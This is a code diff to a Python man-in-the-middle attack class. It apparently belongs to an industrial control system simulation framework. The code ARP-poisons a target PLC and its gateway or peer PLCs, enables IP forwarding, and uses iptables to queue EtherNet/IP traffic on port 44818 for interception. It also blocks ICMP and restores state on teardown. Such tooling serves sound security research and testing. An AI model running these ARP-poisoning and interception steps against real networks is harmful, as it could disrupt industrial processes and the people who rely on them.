@@ -1,5 +1,7 @@
 import argparse
 import os
+import time
+import traceback
 from pathlib import Path
 import threading
 
@@ -33,7 +35,8 @@ class PacketAttack(SyncedAttack):
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
-        self.queue = fnfqueue.Connection()
+        self.queue = None
+        self.q = None
         self.thread = None
         self.run_thread = False
 
@@ -51,16 +54,23 @@ class PacketAttack(SyncedAttack):
         Finally, it launches the thread that will examine all captured packets.
         """
         os.system(
-            f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+            f'iptables -t mangle -A FORWARD -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
+        # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        if self.intermediate_yaml['network_topology_type'] == "simple":
+            for plc in self.intermediate_yaml['plcs']:
+                if plc['name'] != self.intermediate_plc['name']:
+                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])
+
         self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         try:
+            self.queue = fnfqueue.Connection()
             self.q = self.queue.bind(1)
             self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
         except PermissionError:
@@ -102,6 +112,9 @@ class PacketAttack(SyncedAttack):
 
             except fnfqueue.BufferOverflowException:
                 print("Buffer Overflow in a MITM attack!")
+            except Exception as exc:
+                print("Exception in a MITM attack!:", exc)
+                print(traceback.format_exc())
 
     def interrupt(self):
         """
@@ -119,16 +132,23 @@ class PacketAttack(SyncedAttack):
         it will delete the iptable rules and stop the thread.
         """
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        if self.intermediate_yaml['network_topology_type'] == "simple":
+            for plc in self.intermediate_yaml['plcs']:
+                if plc['name'] != self.intermediate_plc['name']:
+                    restore_arp(self.target_plc_ip, plc['local_ip'])
+
         self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         os.system(
-            f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+            f'iptables -t mangle -D FORWARD -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
         self.run_thread = False
+        self.q.unbind()
+        time.sleep(0.5)
         self.queue.close()
         self.thread.join()
 
